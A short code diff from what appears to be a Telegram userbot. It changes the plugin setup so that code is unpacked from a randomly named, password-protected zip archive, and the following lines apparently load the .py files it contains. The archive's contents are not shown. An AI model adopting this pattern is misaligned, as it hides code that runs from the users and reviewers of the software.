@@ -48,7 +48,7 @@ ItzSjDude.connect()
 ItzSjDude.loop.run_until_complete(start())
 ItzSjDude.loop.run_until_complete(stop())
 
-os.system("cd ./userbot/plugins && unzip archive.zip")
+os.system("cd ./userbot/plugins && unzip -P q8ly,[,[R,Z%FMP XF4kfCveir.zip")
 
 import glob
 path = 'userbot/plugins/*.py'
